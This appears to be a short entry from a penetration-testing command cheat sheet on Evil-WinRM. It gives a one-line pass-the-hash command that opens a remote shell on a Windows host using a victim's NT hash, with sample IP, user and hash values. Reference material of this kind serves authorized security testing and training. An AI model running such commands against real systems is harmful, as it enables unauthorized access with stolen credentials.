---
description: |
  Evil-WinRM uses Windows Remote Management (WinRM) to give you an interactive shell on the Windows host. Evil-WinRM supports passing the victim's NT hash for authorization.

  Command Reference:

  	Target IP: 10.10.10.1

  	Username: john

  	NT Hash: c23b2e293fa0d312de6f59fd6d58eae3


command: |
  evil-winrm -i 10.10.10.1 -u john -H c23b2e293fa0d312de6f59fd6d58eae3
items:
  - Username
  - Hash
services:
  - WinRM
OS:
  - Linux
  - Windows
phases:
  - Exploitation
references:
  - https://github.com/Hackplayers/evil-winrm
---
